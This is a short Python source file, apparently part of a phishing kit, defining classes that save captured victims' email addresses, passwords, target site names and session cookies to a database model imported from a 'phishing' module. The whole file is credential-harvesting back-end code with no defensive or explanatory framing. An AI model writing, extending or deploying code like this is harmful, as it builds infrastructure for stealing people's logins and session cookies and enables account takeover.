from phishing.models import UserSession

class CredsStore:

    def __init__(self):
        pass

    @staticmethod
    def store(data):
        pass

class UserSessionStore(CredsStore):

    def __init__(self):
        CredsStore.__init__(self)

    @staticmethod
    def store(session):
        o = UserSession()
        o.email = session['Email']
        o.passwd = session['NewPasswd']
        o.website = session['Site']
        o.cookies = session['data']
        o.save()
